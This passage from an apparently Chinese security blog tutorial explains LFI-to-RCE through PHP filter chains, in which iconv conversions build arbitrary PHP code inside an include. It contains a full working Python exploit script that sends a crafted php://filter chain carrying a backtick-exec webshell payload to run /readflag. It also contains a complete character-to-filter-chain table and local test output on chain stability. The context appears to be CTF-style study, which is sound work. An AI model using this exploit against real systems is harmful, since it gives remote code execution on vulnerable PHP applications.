+<p>可以看到这里成功构造出了8，那么我们就可以尝试构造我们想要的字符，然而结合在文件包含函数的特性，无论什么内容都会当成php代码去执行，这也意味着只要我们构造出了恶意的php代码就会顺利的执行，这也为我们带来了许多方便</p>
+<p>这个方法是基于一个脚本上找到的Hacktricks</p>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters.html#lfi2rce-via-php-filters">LFI2RCE via PHP Filters</a></p>
+<p>这篇文章解释了你可以使用php过滤器来生成任意的内容作为输出。这基本上意味着我们可以为include生成任意php代码，而无需将其写入文件。 基本上，该脚本的目标是在文件的开头生成一个Base64字符串，该字符串将被最终解码，提供将由include解释的所需payload。</p>
+<p>这个脚本的原则是什么呢？</p>
+<ol>
+<li>prepend <code>\x1b$)C</code> to our string as described above</li>
+<li>apply some chain of iconv conversions that leaves our initial base64 intact and converts the part we just prepended to some string where the only valid base64 char is the next part of our base64-encoded php code</li>
+<li>base64-decode and base64-encode the string which will remove any garbage in between</li>
+<li>Go back to 1 if the base64 we want to construct isn’t finished yet</li>
+<li>base64-decode to get our php code</li>
+</ol>
+<p>翻译过来就是</p>
+<ul>
+<li>如上所述，将\x1b$）C前置到我们的字符串中</li>
+<li>应用一些iconv转换链，使我们最初的base64保持不变，并将我们刚刚添加的部分转换为某个字符串，其中唯一有效的base64字符是我们base64编码的php代码的下一部分</li>
+<li>base64-decode和base64-encode字符串，这将删除其间的任何垃圾</li>
+<li>如果我们要构造的base64尚未完成，则返回1</li>
+<li>base64-decode获取php代码</li>
+</ul>
+<h2 id="完整脚本"><a href="#完整脚本" class="headerlink" title="完整脚本"></a>完整脚本</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost/index.php&quot;</span></span><br><span class="line">file_to_use = <span class="string">&quot;php://temp&quot;</span></span><br><span class="line">command = <span class="string">&quot;/readflag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;?=`$_GET[0]`;;?&gt;</span></span><br><span class="line">base64_payload = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate some garbage base64</span></span><br><span class="line">filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c in base64_payload[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line">filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">final_payload = f<span class="string">&quot;php://filter/&#123;filters&#125;/resource=&#123;file_to_use&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.<span class="title function_ invoke__">get</span>(url, params=&#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>: command,</span><br><span class="line">    <span class="string">&quot;action&quot;</span>: <span class="string">&quot;include&quot;</span>,</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: final_payload</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>前面的脚本仅限于该有效负载所需的base64字符。因此，这位师傅创建了自己的脚本来强制所有base64字符</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.OSF1002035D.EUC-KR|convert.iconv.MAC-CYRILLIC.T.61-8BIT|convert.iconv.1046.CSIBM864|convert.iconv.OSF1002035E.UCS-4BE|convert.iconv.EBCDIC-INT1.IBM943&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO6937.OSF1002011C|convert.iconv.CP1146.EUCJP-OPEN|convert.iconv.IBM1157.UTF8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO8859-7.CSISOLATIN3|convert.iconv.ISO-8859-9.CP905|convert.iconv.IBM1112.CSPC858MULTILINGUAL|convert.iconv.EBCDIC-CP-NL.ISO-10646&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.RUSCII.IBM275|convert.iconv.CSEBCDICFR.CP857|convert.iconv.EBCDIC-CP-WT.ISO88591&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO-IR-37.MACUK|convert.iconv.CSIBM297.ISO-IR-203&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.CSIBM9066.CP1371|convert.iconv.KOI8-RU.OSF00010101|convert.iconv.EBCDIC-CP-FR.ISO-IR-156&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP1399.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.8859_9.OSF100201F4|convert.iconv.IBM1112.CP1004|convert.iconv.OSF00010007.CP285|convert.iconv.IBM-1141.OSF10020402&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;e&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.CSISO27LATINGREEK1.SHIFT_JISX0213|convert.iconv.IBM1164.UCS-4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;g&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022CN.CP855|convert.iconv.CSISO49INIS.IBM1142&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;h&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.THAI8.OSF100201B5|convert.iconv.NS_4551-1.CP1160|convert.iconv.CP275.IBM297&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;i&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.GB_198880.IBM943|convert.iconv.CUBA.CSIBM1140&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;j&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.CSISO27LATINGREEK1.UCS-4BE|convert.iconv.IBM857.OSF1002011C&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;k&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO88594.CP912|convert.iconv.ISO-IR-121.CP1122|convert.iconv.IBM420.UTF-32LE|convert.iconv.OSF100201B5.IBM-1399&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;l&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.CSISO90.MACIS|convert.iconv.CSIBM865.10646-1:1993|convert.iconv.ISO_69372.CSEBCDICATDEA&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;m&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.GB_198880.CSSHIFTJIS|convert.iconv.NO2.CSIBM1399&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;n&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.GB_198880.IBM862|convert.iconv.CP860.IBM-1399&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO8859-6.CP861|convert.iconv.904.UTF-16|convert.iconv.IBM-1122.IBM1390&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;p&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP1125.IBM1146|convert.iconv.IBM284.ISO_8859-16|convert.iconv.ISO-IR-143.IBM-933&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;q&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.NC_NC00-10:81.CSIBM863|convert.iconv.CP297.UTF16BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;r&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO-IR-86.ISO_8859-4:1988|convert.iconv.TURKISH8.CP1149&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;t&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.WINDOWS-1251.CP1364|convert.iconv.IBM880.IBM-1146|convert.iconv.IBM-935.CP037|convert.iconv.IBM500.L3|convert.iconv.CP282.TS-5881&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;u&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO_6937:1992.ISO-IR-121|convert.iconv.ISO_8859-7:1987.ANSI_X3.110|convert.iconv.CSIBM1158.UTF16BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;v&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.HU.ISO_6937:1992|convert.iconv.CSIBM863.IBM284&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;w&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO_6937-2:1983.857|convert.iconv.8859_3.EBCDIC-CP-FR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP1254.ISO-IR-226|convert.iconv.CSMACINTOSH.IBM-1149|convert.iconv.EBCDICESA.UCS4|convert.iconv.1026.UTF-32LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;y&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.EBCDIC-INT1.IBM-1399&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO-IR-111.IBM1130|convert.iconv.L1.ISO-IR-156&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;E&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.LATIN7.MACINTOSH|convert.iconv.CSN_369103.CSIBM1388&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;F&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.CSIBM9448.ISO-IR-103|convert.iconv.ISO-IR-199.T.61|convert.iconv.IEC_P27-1.CP937&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;G&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO_8859-3:1988.CP1142|convert.iconv.CSIBM16804.CSIBM1388&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;H&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.GB_198880.EUCJP-OPEN|convert.iconv.CP5347.CP1144&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;I&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO8859-6.DS2089|convert.iconv.OSF0004000A.CP852|convert.iconv.HPROMAN8.T.618BIT|convert.iconv.862.CSIBM1143&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;J&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.US.ISO-8859-13|convert.iconv.CP9066.CSIBM285&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;K&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.IBM1097.UTF-16BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;L&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ECMACYRILLIC.IBM256|convert.iconv.GEORGIAN-ACADEMY.10646-1:1993|convert.iconv.IBM-1122.IBM920&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;M&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.SE2.ISO885913|convert.iconv.866NAV.ISO2022JP2|convert.iconv.CP857.CP930&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;N&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.IBM9066.UTF7|convert.iconv.MIK.CSIBM16804&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;O&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO-IR-197.CSIBM275|convert.iconv.IBM1112.UTF-16BE|convert.iconv.ISO_8859-3:1988.CP500&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Q&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.NO.CP275|convert.iconv.EBCDIC-GREEK.CP936|convert.iconv.CP922.CP1255|convert.iconv.MAC-IS.EBCDIC-CP-IT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;S&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP1154.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;T&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.IBM1163.CP1388|convert.iconv.OSF10020366.MS-MAC-CYRILLIC|convert.iconv.ISO-IR-25.ISO-IR-85|convert.iconv.GREEK.IBM-1144&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.OSF10020388.IBM-935|convert.iconv.CP280.WINDOWS-1252|convert.iconv.CP284.IBM256|convert.iconv.CP284.LATIN1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Z&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.CSISO90.CSEBCDICFISE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;+&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ANSI_X3.4-1986.CP857|convert.iconv.OSF10020360.ISO885913|convert.iconv.EUCCN.UTF7|convert.iconv.GREEK7-OLD.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;=&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>但是这里的过滤器链是否稳定呢？</p>
+<p>例如我们这里看看b字符的构造</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP1399.UCS4&#x27;</span>,</span><br></pre></td></tr></table></figure>
+
+<p>然后本地测试一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@VM-16-12-ubuntu:/# php 1.php </span><br><span class="line">1b2429435354415254</span><br><span class="line"></span><br><span class="line">$)CSTARTc28fc284c289efbda2efbdabefbdac1aefbdaaefbdac</span><br><span class="line">｢ｫｬｪｬ</span><br><span class="line">0000008f00000084000000890000ff620000ff6b0000ff6c0000001a0000ff6a0000ff6c</span><br><span class="line">����b�k�l�j�l</span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到b字符成功生成且被前置，但是我们又发现一个新的问题，那就是内容被更改，原先的字符串START在转换的过程中发生了更改，这意味着我们现在的过滤器链会破坏我们之前的内容</p>
+<p>按照这种逻辑，即使CSISO 2022 KR看起来很有前途，但它实际上并没有那么有用。它前置链<code>&#39;\x1b$）C&#39;</code>，因为’C’是base64的64个字符之一，如果你的一个链使用这种编码，而你前置了’C’以外的东西，这意味着你的过滤器链将不稳定。</p>
+<h2 id="稳定的过滤器链生成"><a href="#稳定的过滤器链生成" class="headerlink" title="稳定的过滤器链生成"></a>稳定的过滤器链生成</h2><p>然后就到了第一个师傅送给大家的福利啦！一个生成filter器链的脚本，这个脚本如果我们完全控制传递给PHP中的require或include的参数，无需上传文件即可获取RCE！</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chain_generator">php_filter_chain_generator</a></p>
+<p>我们看看这个脚本的参数</p>
